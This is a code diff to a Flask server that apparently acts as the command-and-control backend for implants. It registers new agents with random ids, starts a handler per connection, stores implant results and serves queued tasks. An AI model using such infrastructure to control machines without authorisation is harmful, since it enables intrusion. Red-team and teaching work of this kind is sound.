@@ -1,11 +1,14 @@
 import uuid
 import json
+import string
+import secrets
 
 from flask import request, Response
 from flask_restful import Resource
 from database.db import initialize_db
 from database.models import Task, Result, TaskHistory
 
+from handler import Handler
 
 class Tasks(Resource):
     # ListTasks
@@ -58,12 +61,27 @@ class Results(Resource):
     def post(self):
         # Check if results from the implant are populated
         if str(request.get_json()) != '{}':
+            
+            # logging should be added here at some point
+
             # Parse out the result JSON that we want to add to the database
             body = request.get_json()
-            print("Received implant response: {}".format(body))
             json_obj = json.loads(json.dumps(body))
             # Add a result UUID to each result object for tracking
             json_obj['result_id'] = str(uuid.uuid4())
+            # If the agent is new, set a unique agent id, start a new handler, and add it to the agent list
+            try:
+                if(json_obj['agent_id'] == "MA=="):
+                    # Generate unique agent id
+                    alphabet = string.ascii_letters + string.digits
+                    agent_id = ''.join(secrets.choice(alphabet) for i in range(32))
+                    json_obj['agent_id'] = agent_id
+                    # Create new handler for connection
+                    newConn = Handler(agent_id)
+                    newConn.start()
+            except Exception as ex:
+                print("[* Server-Msg] Error with new agent connection.")
+                print(f"[* Server-Msg] Error: {ex}")
             Result(**json_obj).save()
             # Serve latest tasks to implant
             tasks = Task.objects().to_json()
